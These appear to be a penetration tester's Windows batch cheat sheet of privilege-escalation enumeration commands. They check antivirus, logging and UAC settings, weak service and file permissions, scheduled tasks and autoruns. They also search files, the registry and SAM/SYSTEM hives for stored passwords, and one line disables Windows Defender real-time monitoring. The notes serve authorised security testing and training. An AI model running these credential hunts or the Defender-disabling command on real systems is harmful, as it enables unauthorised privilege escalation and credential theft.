REM !!! NOTE: all batch loop commands meant to be copy & pasted (%a vs %%a)
REM ***************************************************************************
REM Resources:
REM ***************************************************************************
REM - https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat
REM - https://toshellandback.com/2015/11/24/ms-priv-esc/
REM - https://securism.wordpress.com/oscp-notes-privilege-escalation-windows/
REM - https://guide.offsecnewbie.com/privilege-escalation/windows-pe
REM - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

REM ***************************************************************************
REM Host Protections
REM ***************************************************************************
REM - check for antivirus:
wmic /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
REM - check for command-line auditing/logging:
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
REM - check where logs are being sent:
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
REM - check what is being logged:
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
REM - check for Local Security Authority protections against code injection:
reg query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v RunAsPPL
REM - check for credential guard:
reg query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags
REM - check for Windows Defender white-listed paths:
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
REM - check if UAC is enabled:
REM - https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REM - get UAC policy details:
REM - https://book.hacktricks.xyz/windows/authentication-credentials-uac-and-efs#uac
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\
REM - Disable Windows Defender (SYSTEM required)
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"

REM ***************************************************************************
REM PowerShell
REM ***************************************************************************
REM - check PowerShell v2 version:
reg query HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine /v PowerShellVersion
REM - check PowerShell v5 version:
reg query HKLM\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine /v PowerShellVersion
REM - check transcriptions settings:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
REM - check module logging settings:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging
REM - check script block logging settings:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
REM - check default transcript history
dir %SystemDrive%\transcripts\
REM - check PS history file
dir "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

REM ***************************************************************************
REM Kernel Information
REM ***************************************************************************
REM - https://github.com/SecWiki/windows-kernel-exploits
REM - https://github.com/AonCyberLabs/Windows-Exploit-Suggester
REM - https://github.com/bitsadmin/wesng
hostname
systeminfo
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion"
wmic qfe get Caption,Description,HotFixID,InstalledOn
REM - Installed drivers:
powershell.exe -c "driverquery /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name','Start Mode',Path"
powershell.exe -c "Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion,Manufacturer"

REM ***************************************************************************
REM Interesting Files
REM ***************************************************************************
dir "C:\Users\" /a /b /s 2>nul | findstr /v /i "Favorites\\" | findstr /v /i "AppData\\" | findstr /v /i "Microsoft\\" |  findstr /v /i "Application Data\\"
dir "C:\Documents and Settings\" /a /b /s 2>nul | findstr /v /i "Favorites\\" | findstr /v /i "AppData\\" | findstr /v /i "Microsoft\\" |  findstr /v /i "Application Data\\"
REM - Mounted drives:
mountvol
wmic logicaldisk get caption
for %%i in (a b d e f g h i j k l m n o p q r s t u v w x y z) do @dir %%i: 2>nul

REM ***************************************************************************
REM Installed Programs
REM ***************************************************************************
dir /b c:\ "C:\Program Files" "C:\Program Files (x86)" | sort
wmic product get name,version,vendor
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr InstallLocation | findstr ":\\"
reg query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\ /s | findstr InstallLocation | findstr ":\\"
REM - Webserver folders:
dir /a /b c:\inetpub\
dir /s /b "c:\apache*" "c:\xampp*"
REM - Editable program files:
powershell.exe -c "Get-ChildItem 'C:\Program Files' -Recurse -Force | ?{Get-ACL $_.FullName | ?{$_.AccessToString -match 'Everyone\sAllow\s\sModify'}}"
powershell.exe -c "Get-ChildItem 'C:\Program Files (x86)' -Recurse -Force | ?{Get-ACL $_.FullName | ?{$_.AccessToString -match 'Everyone\sAllow\s\sModify'}}"

REM ***************************************************************************
REM Accounts & Groups
REM ***************************************************************************
REM - check current clipboard
powershell -command "Get-Clipboard" 2>nul
REM - look for interesting environment strings:
set
REM - look for uncommon tokens:
REM -   SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege,
REM -   SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege,
REM -   SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebbugPrivilege
whoami /priv
REM - look for following & combine with a UAC bypass:
REM -   Mandatory Label\High
REM -   BUILTIN\Administrators
whoami /groups
REM - look for other user accounts:
net user
quser
REM - look for special group access:
net localgroup
net localgroup administrators
REM - check if already privileged user
net session

REM ***************************************************************************
REM Network
REM ***************************************************************************
ipconfig /all
REM - look for local listening processes:
netstat -ano
route print
arp -A
type C:\WINDOWS\System32\drivers\etc\hosts | findstr /v "^#"
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
REM - look for external shares:
net use
net share
REM - look for custom firewall rules:
netsh firewall show state
netsh firewall show config
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all

REM ***************************************************************************
REM Running Processes & Scheduled Tasks
REM ***************************************************************************
REM - check for any other users on the system or interesting processes:
tasklist /v
tasklist /svc
REM - check for a file backdoor:
@echo OFF
for /f "tokens=2 delims='='" %x in ('wmic process list full^|findstr /i "executablepath"^|findstr /i /v "system32"^|findstr ":"') do (
  for /f eol^=^"^ delims^=^" %z in ('ECHO.%x') do (
    icacls "%z" 2>nul | findstr /i "(F) (M) (W)" | findstr /i "everyone authenticated users %username%" && ECHO.
  )
)
@echo ON
REM - checking for DLL injection:
@echo OFF
for /f "tokens=2 delims='='" %x in ('wmic process list full^|findstr /i "executablepath"^|findstr /i /v "system32"^|findstr ":"') do (
  for /f eol^=^"^ delims^=^" %y in ('ECHO.%x') do (
    icacls "%~dpy\" 2>nul | findstr /i "(F) (M) (W)" | findstr /i "everyone authenticated users %username%" && ECHO.
  )
)
@echo ON
REM - checking for DLL injection by PATH injection:
@echo OFF
for %A in ("%path:;=";"%") do (
  icacls "%~A" 2>nul | findstr /i "(F) (M) (W)" | findstr /i "everyone authenticated users %username%" && ECHO.!!! MODIFY %A
)
@echo ON
REM - check for autorun binaries for impersonation:
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 2>nul
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 2>nul
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul
icacls "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul | findstr /i "(F) (M) (W)" | findstr /i "everyone authenticated users %username%" && ECHO. & ^
icacls "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\*" 2>nul | findstr /i "(F) (M) (W)" | findstr /i "everyone authenticated users %username%" && ECHO. & ^
icacls "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul | findstr /i "(F) (M) (W)" | findstr /i "everyone authenticated users %username%" && ECHO. & ^
icacls "C:\Documents and Settings\%username%\Start Menu\Programs\Startup\*" 2>nul | findstr /i "(F) (M) (W)" | findstr /i "everyone authenticated users %username%" && ECHO. & ^
icacls "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul | findstr /i "(F) (M) (W)" | findstr /i "everyone authenticated users %username%" && ECHO. & ^
icacls "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\*" 2>nul | findstr /i "(F) (M) (W)" | findstr /i "everyone authenticated users %username%" && ECHO. & ^
icacls "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul | findstr /i "(F) (M) (W)" | findstr /i "everyone authenticated users %username%" && ECHO. & ^
icacls "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*" 2>nul | findstr /i "(F) (M) (W)" | findstr /i "everyone authenticated users %username%" && ECHO. & ^
REM - check for uncommon tasks
schtasks /query /fo LIST /v | findstr /i "TaskName" | findstr /i /v "\\Microsoft\\Windows\\"
@echo OFF
for /f "tokens=2 delims=:" %p in ('schtasks /query /fo LIST /v^|findstr /i "TaskName"^|findstr /i /v "\\Microsoft\\Windows\\"') do (
  for /f "tokens=* delims= " %t in ("%p") do (
    schtasks /query /fo LIST /v /tn "%t"
  )
)
@echo ON
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab informa")

REM ***************************************************************************
REM Services
REM ***************************************************************************
REM - Services with weak folder permissions:
for /f "tokens=2 delims='='" %a in ('wmic service list full^|findstr /i "pathname"^|findstr /i /v "system32"') do cmd.exe /c icacls "%a"
REM - Services with non-quoted spaces:
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows"
for /F "tokens=2* delims= " %i in ('sc query ^| find /I "ce_name"') do @sc qc %i %j | findstr "BINARY_PATH_NAME" | findstr /v "C:\Windows"
REM - Service permissions:
cd %TEMP% & sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @sc sdshow %i & @echo ---------) & del a 2>nul & del b 2>nul
REM - https://download.sysinternals.com/files/AccessChk.zip
REM - XP: https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "BUILTIN\Users" *
accesschk.exe /accepteula -uwcqv "%username%" *
REM - check if able to modify any service registry values
@echo OFF
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv >nul 2>&1 & reg save %a %temp%\reg.hiv >nul 2>&1 && reg restore %a %temp%\reg.hiv >nul 2>&1 && ECHO.!!! MODIFY %a
@echo ON

REM ***************************************************************************
REM Stored Passwords
REM ***************************************************************************

cmdkey /list

findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

cd c:\ && dir /s *pass* == *cred* == *vnc* == *.config*
cd c:\ && dir /a /s /b *.kdbx *vnc.ini *.rdp
cd c:\ && dir /s /b php.ini httpd.conf httpd-xampp.conf my.ini my.cnf web.config
type C:\Windows\System32\inetsrv\config\applicationHost.config 2>nul
cd c:\ && dir /b /s unattended.xml* sysprep.xml* sysprep.inf* unattend.xml*

dir %SYSTEMROOT%\repair\SAM 2>nul
dir %SYSTEMROOT%\System32\config\RegBack\SAM 2>nul
dir %SYSTEMROOT%\System32\config\SAM 2>nul
dir %SYSTEMROOT%\repair\system 2>nul
dir %SYSTEMROOT%\System32\config\SYSTEM 2>nul
dir %SYSTEMROOT%\System32\config\RegBack\system 2>nul
dir /a /b /s SAM.b*

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query HKLM /f password /t REG_SZ /s /k
reg query HKCU /f password /t REG_SZ /s /k
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

REM last resorts ...
start /b findstr /sim password *.xml *.ini *.txt *.config *.bak 2>nul
dir /s /b *pass* *cred* *vnc* *.config*

REM ***************************************************************************
REM MISC
REM ***************************************************************************
REM - check for WSUXploit:
REM - https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\ 2>nul | findstr /i "wuserver" | findstr /i "http://"
IF exist C:\Windows\CCM\SCClient.exe ECHO.SCCM is installed (installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading)
IF exist "%AppLocal%\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings" ECHO.Found: RDCMan.settings in %AppLocal%\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings, check for credentials in .rdg files
REM - https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul

REM ***************************************************************************
REM Active Directory
REM ***************************************************************************
REM - list kerberos tickets
klist
REM - get computers on domain with SMB enabled:
net view
REM - get users in the domain:
net user /domain
REM - get groups in the domain:
net group /domain
REM - check for login brute-forcing lockout:
net accounts | findstr Lockout